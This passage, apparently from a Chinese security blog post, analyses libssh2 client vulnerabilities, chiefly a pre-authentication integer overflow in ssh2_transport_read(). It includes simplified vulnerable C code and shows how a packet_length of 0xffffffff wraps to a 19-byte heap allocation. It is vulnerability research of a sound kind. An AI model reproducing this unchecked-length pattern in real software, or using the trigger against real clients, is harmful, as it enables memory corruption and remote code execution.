@@ -1,0 +1,1385 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>libssh2漏洞分析：恶意SSH服务器破坏客户端内存 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>libssh2漏洞分析：恶意SSH服务器破坏客户端内存</h1>
+<time>2026-07-30</time>
+<ul>
+<li>安全</li>
+<li>漏洞分析
+Slug: libssh2漏洞分析恶意ssh服务器破坏客户端内存</li>
+</ul>
+<hr />
+<h2>目录</h2>
+<ul>
+<li><a href="#1-引言客户端安全模型的盲区">1. 引言：客户端安全模型的盲区</a></li>
+<li><a href="#2-libssh2库与ssh协议基础">2. libssh2库与SSH协议基础</a></li>
+<li><a href="#3-cve-2026-55200整数溢出至堆溢出预认证rce">3. CVE-2026-55200：整数溢出至堆溢出（预认证RCE）</a></li>
+<li><a href="#31-漏洞概况">3.1 漏洞概况</a></li>
+<li><a href="#32-ssh二进制包协议结构">3.2 SSH二进制包协议结构</a></li>
+<li><a href="#33-根因分析transportc中的整数溢出">3.3 根因分析：transport.c中的整数溢出</a></li>
+<li><a href="#34-19字节的魔法0xffffffff回绕计算">3.4 19字节的魔法：0xffffffff回绕计算</a></li>
+<li><a href="#35-恶意ssh服务器poc框架">3.5 恶意SSH服务器PoC框架</a></li>
+<li><a href="#4-cve-2026-66032sftp双重释放漏洞">4. CVE-2026-66032：SFTP双重释放漏洞</a></li>
+<li><a href="#41-漏洞概况">4.1 漏洞概况</a></li>
+<li><a href="#42-根因分析sftp_open中的双重释放">4.2 根因分析：sftp_open()中的双重释放</a></li>
+<li><a href="#43-tcache-dup利用原理">4.3 tcache dup利用原理</a></li>
+<li><a href="#5-历史漏洞回顾cve-2019-3855至cve-2019-3863系列">5. 历史漏洞回顾：CVE-2019-3855至CVE-2019-3863系列</a></li>
+<li><a href="#6-正常ssh包-vs-畸形ssh包结构对比">6. 正常SSH包 vs 畸形SSH包结构对比</a></li>
+<li><a href="#7-攻击场景分析">7. 攻击场景分析</a></li>
+<li><a href="#8-防御方案">8. 防御方案</a></li>
+<li><a href="#9-总结">9. 总结</a></li>
+<li><a href="#免责声明">免责声明</a></li>
+</ul>
+<hr />
+<h2>1. 引言：客户端安全模型的盲区</h2>
+<p>在SSH安全领域，传统的研究焦点几乎全部集中在服务器端——防止暴力破解、加固sshd配置、管理密钥。但2026年披露的一系列libssh2漏洞将安全模型翻转了过来：<strong>不是客户端攻击服务器，而是恶意服务器攻击客户端</strong>。</p>
+<p>想象这样一个场景：你的CI/CD流水线每天自动连接数十个远程Git仓库拉取代码；你的备份脚本通过SFTP定期同步文件到远程服务器；你的监控系统通过SSH轮询远程主机状态。这些操作都依赖libssh2库。如果其中一个远程服务器被攻击者控制或伪造，它只需要在握手阶段发送一个精心构造的数据包，就能在你的客户端机器上触发堆溢出，进而实现远程代码执行。更可怕的是，这一切发生在认证之前——不需要任何凭据。</p>
+<p>本文将深度分析libssh2的两个关键漏洞：CVE-2026-55200（预认证整数溢出至堆溢出，CVSS 9.2）和CVE-2026-66032（SFTP双重释放，CVSS 8.8），并回顾2019年的CVE-2019-3855至CVE-2019-3863历史漏洞系列，揭示libssh2代码库中反复出现的输入验证缺陷模式。</p>
+<hr />
+<h2>2. libssh2库与SSH协议基础</h2>
+<h3>2.1 libssh2简介</h3>
+<p>libssh2是一个用C语言实现的SSH2协议客户端库。它不是SSH服务器守护进程，而是帮助其他软件发起出站SSH连接的库。以下是libssh2被广泛嵌入的场景：</p>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────────┐
+│                    libssh2 嵌入场景与攻击面                       │
+├──────────────────┬──────────────────┬───────────────────────────┤
+│     应用程序      │   嵌入方式        │       更新路径             │
+├──────────────────┼──────────────────┼───────────────────────────┤
+│ curl             │ 动态链接(多数发行版)│ 操作系统包管理器           │
+│ Git / libgit2    │ 动态或静态链接    │ 操作系统或应用更新         │
+│ PHP ssh2扩展     │ 动态链接          │ PHP/PECL更新              │
+│ 备份代理         │ 常为静态链接      │ 需要厂商安全公告           │
+│ IoT/网络固件     │ 固件中静态编译    │ 厂商固件发布               │
+│ CI/CD工具        │ Vendored或容器化  │ 容器镜像重建               │
+│ Paramiko (Python)│ 独立实现(非libssh2)│ 不受影响(但协议层类似)     │
+└──────────────────┴──────────────────┴───────────────────────────┘
+</code></pre></div>
+
+<p>关键风险点在于静态链接的副本：操作系统包管理器更新了系统级libssh2包，但那些静态编译进备份代理或固件中的libssh2副本不会被更新，它们会继续以漏洞状态运行。</p>
+<h3>2.2 SSH协议握手流程</h3>
+<p>SSH连接的建立遵循严格的阶段顺序：</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌─────────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">                     </span><span class="n">SSH</span><span class="w"> </span><span class="n">连接建立流程</span><span class="w">                                  </span><span class="err">│</span>
+<span class="err">├─────────────────────────────────────────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">                                                                     </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">客户端</span><span class="w">                                </span><span class="n">服务器</span><span class="w">                        </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">                                    </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="mf">1.</span><span class="w"> </span><span class="n">TCP</span><span class="w"> </span><span class="n">三次握手</span><span class="w">                   </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│──────────────────────────────────</span><span class="o">-&gt;</span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">                                    </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="mf">2.</span><span class="w"> </span><span class="n">版本字符串交换</span><span class="w">                  </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="n">SSH</span><span class="o">-</span><span class="mf">2.0</span><span class="o">-</span><span class="n">libssh2_1</span><span class="mf">.11.1</span><span class="w">          </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="o">&lt;</span><span class="err">──────────────────────────────────</span><span class="o">&gt;|</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="n">SSH</span><span class="o">-</span><span class="mf">2.0</span><span class="o">-</span><span class="n">OpenSSH_9</span><span class="mf">.0</span><span class="w">              </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">                                    </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="mf">3.</span><span class="w"> </span><span class="n">算法协商</span><span class="w"> </span><span class="p">(</span><span class="n">SSH_MSG_KEXINIT</span><span class="p">)</span><span class="w">     </span><span class="err">│</span><span class="w">  </span><span class="o">&lt;</span><span class="c1">-- CVE-2026-55200       │</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="o">[</span><span class="n">packet_length</span><span class="o">][</span><span class="n">payload</span><span class="o">][</span><span class="n">MAC</span><span class="o">]</span><span class="w">    </span><span class="err">│</span><span class="w">      </span><span class="n">在此阶段触发</span><span class="w">          </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="o">&lt;</span><span class="err">──────────────────────────────────</span><span class="o">&gt;|</span><span class="w">      </span><span class="p">(</span><span class="n">预认证</span><span class="err">!</span><span class="p">)</span><span class="w">            </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">                                    </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="mf">4.</span><span class="w"> </span><span class="n">密钥交换</span><span class="w"> </span><span class="p">(</span><span class="n">DH</span><span class="o">/</span><span class="n">ECDH</span><span class="p">)</span><span class="w">             </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="o">&lt;</span><span class="err">──────────────────────────────────</span><span class="o">&gt;|</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">                                    </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="mf">5.</span><span class="w"> </span><span class="n">认证</span><span class="w"> </span><span class="p">(</span><span class="n">SSH_MSG_USERAUTH_</span><span class="o">*</span><span class="p">)</span><span class="w">      </span><span class="err">│</span><span class="w">  </span><span class="o">&lt;</span><span class="c1">-- CVE-2019-3856/3863   │</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="o">&lt;</span><span class="err">──────────────────────────────────</span><span class="o">&gt;|</span><span class="w">      </span><span class="n">在此阶段触发</span><span class="w">          </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">                                    </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="mf">6.</span><span class="w"> </span><span class="n">通道建立</span><span class="w"> </span><span class="p">(</span><span class="n">SSH_MSG_CHANNEL_</span><span class="o">*</span><span class="p">)</span><span class="w">   </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="o">&lt;</span><span class="err">──────────────────────────────────</span><span class="o">&gt;|</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">                                    </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="mf">7.</span><span class="w"> </span><span class="n">SFTP</span><span class="w"> </span><span class="n">会话</span><span class="w">                      </span><span class="err">│</span><span class="w">  </span><span class="o">&lt;</span><span class="c1">-- CVE-2026-66032       │</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">  </span><span class="n">SSH_FXP_OPEN</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">STATUS</span><span class="w">            </span><span class="err">│</span><span class="w">      </span><span class="n">在此阶段触发</span><span class="w">          </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="o">&lt;</span><span class="err">──────────────────────────────────</span><span class="o">&gt;|</span><span class="w">      </span><span class="p">(</span><span class="n">已认证</span><span class="p">)</span><span class="w">             </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="err">│</span><span class="w">                                    </span><span class="err">│</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="o">[</span><span class="n">认证前漏洞: CVE-2026-55200, CVE-2026-66033, CVE-2026-66035</span><span class="o">]</span><span class="w">     </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="o">[</span><span class="n">认证后漏洞: CVE-2026-66032, CVE-2025-15661, CVE-2019-3860</span><span class="o">]</span><span class="w">     </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                     </span><span class="err">│</span>
+<span class="err">└─────────────────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<p>理解这个流程至关重要：CVE-2026-55200发生在第3步（算法协商），这意味着攻击者不需要任何凭据，只需要客户端发起TCP连接即可触发漏洞。</p>
+<hr />
+<h2>3. CVE-2026-55200：整数溢出至堆溢出（预认证RCE）</h2>
+<h3>3.1 漏洞概况</h3>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE编号</td>
+<td>CVE-2026-55200</td>
+</tr>
+<tr>
+<td>CVSS 4.0评分</td>
+<td>9.2 (Critical)</td>
+</tr>
+<tr>
+<td>CWE分类</td>
+<td>CWE-680 (Integer Overflow to Buffer Overflow)</td>
+</tr>
+<tr>
+<td>影响版本</td>
+<td>libssh2 所有版本至1.11.1（含）</td>
+</tr>
+<tr>
+<td>漏洞函数</td>
+<td><code>ssh2_transport_read()</code> in <code>src/transport.c</code></td>
+</tr>
+<tr>
+<td>攻击向量</td>
+<td>网络，预认证，无需用户交互</td>
+</tr>
+<tr>
+<td>披露日期</td>
+<td>2026年6月17日</td>
+</tr>
+<tr>
+<td>披露者</td>
+<td>Tristan Madani (TristanInSec)</td>
+</tr>
+<tr>
+<td>修复commit</td>
+<td><code>97acf3dfda80c91c3a8c9f2372546301d4a1a7a8</code> (PR #2052)</td>
+</tr>
+<tr>
+<td>修复者</td>
+<td>Will Cosgrove</td>
+</tr>
+<tr>
+<td>PoC状态</td>
+<td>公开（exploitarium仓库，本地验证框架）</td>
+</tr>
+<tr>
+<td>伴随漏洞</td>
+<td>CVE-2026-55199 (CVSS 8.2, DoS), CVE-2025-15661 (CVSS 8.3, SFTP堆越读)</td>
+</tr>
+</tbody>
+</table>
+<p>这个漏洞最令人震惊的一点是：<strong>影响版本是"所有版本"</strong>。不是"1.10.0到1.11.1"，而是从libssh2项目诞生以来的全部版本。<code>packet_length</code>的下界检查从第一天就存在，上界检查从第一天就缺失。这个漏洞在代码库中潜伏了十几年。</p>
+<h3>3.2 SSH二进制包协议结构</h3>
+<p>RFC 4253第6节定义了SSH传输层二进制包格式：</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">                   </span><span class="n">SSH</span><span class="w"> </span><span class="n">二进制包结构</span><span class="w"> </span><span class="p">(</span><span class="n">RFC</span><span class="w"> </span><span class="mi">4253</span><span class="w"> </span><span class="err">§</span><span class="mi">6</span><span class="p">)</span><span class="w">                  </span><span class="err">│</span>
+<span class="err">├──────────────────────────────────────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">偏移</span><span class="w">    </span><span class="n">字段</span><span class="w">              </span><span class="n">长度</span><span class="w">    </span><span class="n">说明</span><span class="w">                          </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">──────────────────────────────────────────────────────────────</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="mi">0</span><span class="w">       </span><span class="n">packet_length</span><span class="w">    </span><span class="mi">4</span><span class="n">字节</span><span class="w">   </span><span class="n">payload</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">padding的总长度</span><span class="w">      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                  </span><span class="p">(</span><span class="n">不含自身4字节和MAC</span><span class="p">)</span><span class="w">            </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="mi">4</span><span class="w">       </span><span class="n">padding_length</span><span class="w">   </span><span class="mi">1</span><span class="n">字节</span><span class="w">   </span><span class="n">随机填充的长度</span><span class="w">                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="mi">5</span><span class="w">       </span><span class="n">payload</span><span class="w">          </span><span class="n">n1字节</span><span class="w">  </span><span class="n">实际消息内容</span><span class="w">                    </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                  </span><span class="n">n1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">packet_length</span><span class="w">              </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                      </span><span class="o">-</span><span class="w"> </span><span class="n">padding_length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="w">        </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="mi">5</span><span class="o">+</span><span class="n">n1</span><span class="w">    </span><span class="n">random</span><span class="w"> </span><span class="n">padding</span><span class="w">   </span><span class="n">n2字节</span><span class="w">  </span><span class="n">随机字节</span><span class="err">，</span><span class="n">n2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">padding_length</span><span class="w">  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="mi">5</span><span class="o">+</span><span class="n">n1</span><span class="o">+</span><span class="n">n2</span><span class="w"> </span><span class="n">MAC</span><span class="w">              </span><span class="n">m字节</span><span class="w">   </span><span class="n">消息认证码</span><span class="w"> </span><span class="p">(</span><span class="n">可选</span><span class="p">)</span><span class="w">              </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                  </span><span class="n">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mac_length</span><span class="w">                 </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nl">图示</span><span class="p">:</span><span class="w">                                                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌──────────┬────────────┬─────────────┬───────────┬──────────┐</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="n">uint32</span><span class="w">  </span><span class="err">│</span><span class="w">    </span><span class="n">byte</span><span class="w">    </span><span class="err">│</span><span class="w">   </span><span class="n">byte</span><span class="o">[</span><span class="n">n1</span><span class="o">]</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">byte</span><span class="o">[</span><span class="n">n2</span><span class="o">]</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="n">byte</span><span class="o">[</span><span class="n">m</span><span class="o">]</span><span class="w">  </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="n">packet</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="n">padding</span><span class="w">   </span><span class="err">│</span><span class="w">   </span><span class="n">payload</span><span class="w">   </span><span class="err">│</span><span class="w">  </span><span class="n">random</span><span class="w">   </span><span class="err">│</span><span class="w">   </span><span class="n">MAC</span><span class="w">    </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="n">length</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="n">length</span><span class="w">    </span><span class="err">│</span><span class="w">             </span><span class="err">│</span><span class="w">  </span><span class="n">padding</span><span class="w">  </span><span class="err">│</span><span class="w">          </span><span class="err">│</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└──────────┴────────────┴─────────────┴───────────┴──────────┘</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="mi">0</span><span class="w">          </span><span class="mi">4</span><span class="w">            </span><span class="mi">5</span><span class="w">             </span><span class="mi">5</span><span class="o">+</span><span class="n">n1</span><span class="w">        </span><span class="mi">5</span><span class="o">+</span><span class="n">n1</span><span class="o">+</span><span class="n">n2</span><span class="w">      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="n">packet_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">padding_length</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">payload</span><span class="p">(</span><span class="n">n1</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">padding</span><span class="p">(</span><span class="n">n2</span><span class="p">)</span><span class="w">  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nl">即</span><span class="p">:</span><span class="w"> </span><span class="n">n1</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">n2</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">packet_length</span><span class="w">                                 </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">└──────────────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<p><code>packet_length</code>是包头第一个字段，4字节大端无符号整数。客户端读到这个值后，按它分配缓冲区、读取后续数据。正常SSH包这个值在几百到几万字节之间（例如密钥交换的<code>SSH_MSG_KEXINIT</code>包大约500-2000字节），但协议规范没有强制校验这个值的合理上界——实现层必须自己防御。</p>
+<h3>3.3 根因分析：transport.c中的整数溢出</h3>
+<p>漏洞位于<code>src/transport.c</code>的<code>ssh2_transport_read()</code>函数中。以下是漏洞代码的简化分析：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// src/transport.c - ssh2_transport_read() 函数</span>
+<span class="c1">// 以下为漏洞代码的简化版，展示核心问题</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">ssh2_transport_read</span><span class="p">(</span><span class="n">LIBSSH2_SESSION</span><span class="w"> </span><span class="o">*</span><span class="n">session</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">transportpacket</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">session</span><span class="o">-&gt;</span><span class="n">packet</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">block</span><span class="p">[</span><span class="n">SSH_BLOCK_SIZE</span><span class="p">];</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">rc</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// ... 读取第一个加密块 ...</span>
+<span class="w">    </span><span class="n">rc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">session</span><span class="o">-&gt;</span><span class="n">recv</span><span class="p">(</span><span class="n">session</span><span class="o">-&gt;</span><span class="n">abstract</span><span class="p">,</span><span class="w"> </span><span class="n">block</span><span class="p">,</span><span class="w"> </span><span class="n">block_size</span><span class="p">);</span>
+
+<span class="w">    </span><span class="c1">// 从block中解析packet_length (4字节大端无符号整数)</span>
+<span class="w">    </span><span class="c1">// ssh2_ntohu32: 网络字节序转主机字节序</span>
+<span class="w">    </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">packet_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ssh2_ntohu32</span><span class="p">(</span><span class="n">block</span><span class="p">);</span><span class="w">  </span><span class="c1">// 攻击者完全可控!</span>
+
+<span class="w">    </span><span class="c1">// 漏洞根因: 只检查下界，没有检查上界!</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">packet_length</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">LIBSSH2_ERROR_DECRYPT</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// *** 上界检查缺失 ***</span>
+<span class="w">    </span><span class="c1">// 正常应该有: if (p-&gt;packet_length &gt; LIBSSH2_PACKET_MAXPAYLOAD) return ERROR;</span>
+<span class="w">    </span><span class="c1">// 但这行代码不存在!</span>
+
+<span class="w">    </span><span class="cm">/* total_num 计算后续需要分配的缓冲区大小 */</span>
+<span class="w">    </span><span class="c1">// total_num 包含 packet_length 本身 + 额外开销</span>
+<span class="w">    </span><span class="c1">// 这里的算术运算使用32位无符号整数</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">total_num</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// 漏洞算术: 当 packet_length = 0xffffffff 时发生整数溢出</span>
+<span class="w">    </span><span class="c1">// 具体计算路径(简化):</span>
+<span class="w">    </span><span class="n">total_num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span><span class="w">  </span><span class="c1">// packet_length字段自身</span>
+<span class="w">    </span><span class="n">total_num</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">packet_length</span><span class="p">;</span><span class="w">      </span><span class="c1">// 0xffffffff + 4 = 0x3 (回绕!)</span>
+<span class="w">    </span><span class="n">total_num</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">mac_len</span><span class="p">;</span><span class="w">               </span><span class="c1">// 0x3 + mac_len</span>
+<span class="w">    </span><span class="n">total_num</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">auth_len</span><span class="p">;</span><span class="w">              </span><span class="c1">// 继续累加(仍然很小)</span>
+
+<span class="w">    </span><span class="c1">// 检查total_num是否合理 (但total_num已经回绕为小值，通过检查!)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">total_num</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">total_num</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">35000</span><span class="p">)</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">LIBSSH2_ERROR_INVAL</span><span class="p">;</span>
+<span class="w">    </span><span class="c1">// total_num ≈ 19，通过检查!</span>
+
+<span class="w">    </span><span class="c1">// 分配缓冲区: 只分配了19字节!</span>
+<span class="w">    </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LIBSSH2_ALLOC</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">total_num</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">payload</span><span class="p">)</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">LIBSSH2_ERROR_ALLOC</span><span class="p">;</span>
+
+<span class="w">    </span><span class="c1">// ... 后续代码按原始 packet_length (0xffffffff) 语义读取数据 ...</span>
+<span class="w">    </span><span class="c1">// 往19字节的缓冲区中写入大量数据 -&gt; 堆溢出!</span>
+
+<span class="w">    </span><span class="c1">// 读取payload数据到缓冲区</span>
+<span class="w">    </span><span class="c1">// 这里使用的长度仍然基于原始的packet_length</span>
+<span class="w">    </span><span class="n">rc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">session</span><span class="o">-&gt;</span><span class="n">recv</span><span class="p">(</span><span class="n">session</span><span class="o">-&gt;</span><span class="n">abstract</span><span class="p">,</span><span class="w"> </span>
+<span class="w">                       </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">payload</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="w">           </span><span class="c1">// 偏移到payload区域</span>
+<span class="w">                       </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">packet_length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w">    </span><span class="c1">// 0xffffffff - 1 ≈ 4GB!</span>
+<span class="w">    </span><span class="c1">// 堆溢出! 19字节缓冲区被写入海量数据</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>核心问题可以用一行伪代码概括：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 漏洞本质:</span>
+<span class="kt">uint32_t</span><span class="w"> </span><span class="n">packet_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xffffffff</span><span class="p">;</span><span class="w">  </span><span class="c1">// 攻击者控制</span>
+<span class="kt">uint32_t</span><span class="w"> </span><span class="n">total_num</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">packet_length</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">mac_len</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">auth_len</span><span class="p">;</span>
+<span class="c1">// 4 + 0xffffffff + 0 + 16 = 0x00000013 = 19 (模 2^32 回绕)</span>
+
+<span class="n">malloc</span><span class="p">(</span><span class="mi">19</span><span class="p">);</span><span class="w">  </span><span class="c1">// 只分配19字节</span>
+<span class="c1">// 但后续按 packet_length = 0xffffffff 的语义写入数据</span>
+<span class="c1">// =&gt; 堆溢出 (Heap Buffer Overflow)</span>
+</code></pre></div>
+
+<h3>3.4 19字节的魔法：0xffffffff回绕计算</h3>
+<p>19这个数字不是随意的，它是<code>0xffffffff</code>经过<code>ssh2_transport_read()</code>中算术运算回绕后的精确结果。具体回绕路径取决于libssh2内部<code>total_num</code>的计算公式（含<code>block_size</code>、<code>mac_size</code>、<code>padding</code>等偏移）：</p>
+<div class="highlight"><pre><span></span><code><span class="err">回绕计算详解</span><span class="w"> </span><span class="p">(</span><span class="err">以特定配置为例</span><span class="p">):</span>
+
+<span class="err">假设配置</span><span class="p">:</span>
